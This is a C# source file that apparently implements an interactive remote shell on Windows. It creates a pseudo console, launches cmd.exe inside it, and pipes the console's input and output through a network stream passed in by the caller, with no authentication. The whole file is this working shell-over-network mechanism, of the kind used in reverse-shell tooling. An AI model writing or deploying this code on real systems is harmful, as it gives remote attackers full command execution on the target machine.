public class PtyLauncher {
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct COORD { public short X; public short Y; }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct STARTUPINFOEX { public STARTUPINFO StartupInfo; public System.IntPtr lpAttributeList; }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public System.IntPtr lpReserved2; public System.IntPtr hStdInput; public System.IntPtr hStdOutput; public System.IntPtr hStdError; }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public System.IntPtr hProcess; public System.IntPtr hThread; public int dwProcessId; public int dwThreadId; }

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CreatePseudoConsole(COORD size, System.IntPtr hInput, System.IntPtr hOutput, uint dwFlags, out System.IntPtr phPC);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, System.IntPtr lpProcessAttributes, System.IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, System.IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(System.IntPtr lpAttributeList, int dwAttributeCount, uint dwFlags, ref System.IntPtr lpSize);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(System.IntPtr lpAttributeList, uint dwFlags, System.IntPtr attribute, System.IntPtr lpValue, System.IntPtr cbSize, System.IntPtr lpPreviousValue, System.IntPtr lpReturnSize);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreatePipe(out System.IntPtr hReadPipe, out System.IntPtr hWritePipe, System.IntPtr lpPipeAttributes, uint nSize);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadFile(System.IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, System.IntPtr lpOverlapped);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(System.IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, System.IntPtr lpOverlapped);

    public static void Run(System.IO.Stream networkStream, short width, short height) {
        System.IntPtr hInR, hInW, hOutR, hOutW;
        CreatePipe(out hInR, out hInW, System.IntPtr.Zero, 0);
        CreatePipe(out hOutR, out hOutW, System.IntPtr.Zero, 0);
        System.IntPtr hPC;
        CreatePseudoConsole(new COORD { X = width, Y = height }, hInR, hOutW, 0, out hPC);

        System.Threading.Tasks.Task.Run(() => {
            byte[] buf = new byte[1024];
            int read;
            try { while ((read = networkStream.Read(buf, 0, buf.Length)) > 0) { uint written; WriteFile(hInW, buf, (uint)read, out written, System.IntPtr.Zero); } } catch {}
        });

        System.Threading.Tasks.Task.Run(() => {
            byte[] buf = new byte[1024];
            uint read;
            try { while (ReadFile(hOutR, buf, (uint)buf.Length, out read, System.IntPtr.Zero) && read > 0) { networkStream.Write(buf, 0, (int)read); networkStream.Flush(); } } catch {}
        });

        var si = new STARTUPINFOEX();
        si.StartupInfo.cb = System.Runtime.InteropServices.Marshal.SizeOf(si);
        System.IntPtr lpSize = System.IntPtr.Zero;
        InitializeProcThreadAttributeList(System.IntPtr.Zero, 1, 0, ref lpSize);
        si.lpAttributeList = System.Runtime.InteropServices.Marshal.AllocHGlobal(lpSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
        UpdateProcThreadAttribute(si.lpAttributeList, 0, (System.IntPtr)0x00020016, hPC, (System.IntPtr)System.IntPtr.Size, System.IntPtr.Zero, System.IntPtr.Zero);
        PROCESS_INFORMATION pi;
        CreateProcess(null, "cmd.exe", System.IntPtr.Zero, System.IntPtr.Zero, true, 0x00080000, System.IntPtr.Zero, null, ref si, out pi);
    }
}
